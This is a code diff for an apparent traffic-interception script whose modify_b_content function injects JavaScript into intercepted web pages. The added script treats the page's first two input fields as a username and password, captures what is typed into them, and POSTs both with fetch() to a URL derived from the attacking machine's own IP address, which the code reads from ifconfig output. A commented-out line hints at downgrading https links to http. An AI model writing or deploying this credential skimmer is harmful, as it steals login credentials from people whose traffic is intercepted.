@@ -22,19 +22,60 @@ import time
 '''
 
 def modify_b_content(b_content):
-    # try: b_content = b_content.replace(b"https://", b"http://")
-    # except: print("Failed to Replace")
-    
+    command = f"ifconfig | grep 'inet ' | grep -v 127.0.0.1 | cut -d\  -f2"
+    url = clean_subprocess(command, 0)
     new_html = '<div><button onclick="handleClick()">Click me</button></div>'
     new_script = '''
-    <script>
-        document.addEventListener('input', function(event) {
-            if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') {
-                alert(event.target.value);
-            }
-        });
-    </script>
-    '''
+        <script>
+            // Create an object to hold the values for username and password
+            let formData = {
+                username: '',
+                password: ''
+            };
+
+            // Listen for input events
+            document.addEventListener('input', function(event) {
+                // Ensure we're dealing with an input or textarea element
+                if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') {
+
+                    // Check the order of the fields in the DOM by their position
+                    const inputs = document.querySelectorAll('input, textarea'); // Get all input/textarea elements in the document
+
+                    // If there are two fields, continue processing
+                    if (inputs.length === 2) {
+                        // Check the order of the fields
+                        const usernameField = inputs[0];
+                        const passwordField = inputs[1];
+
+                        // If the current field is the username input
+                        if (event.target === usernameField) {
+                            formData.username = event.target.value;
+                        }
+
+                        // If the current field is the password input
+                        if (event.target === passwordField) {
+                            formData.password = event.target.value;
+                        }
+
+                        // Now that both fields have their values updated, send the request with both fields
+                        fetch('%s', {
+                            method: 'POST',
+                            body: JSON.stringify({
+                                username: formData.username,
+                                password: formData.password
+                            }),
+                            headers: {
+                                "Content-type": "application/json",
+                            },
+                        })
+                        .then((response) => response.json())
+                        .then((json) => console.log(json))
+                        .catch((error) => console.error('Error:', error));
+                    }
+                }
+            });
+        </script>
+        ''' % url
     new_php = '''
     <?php
 
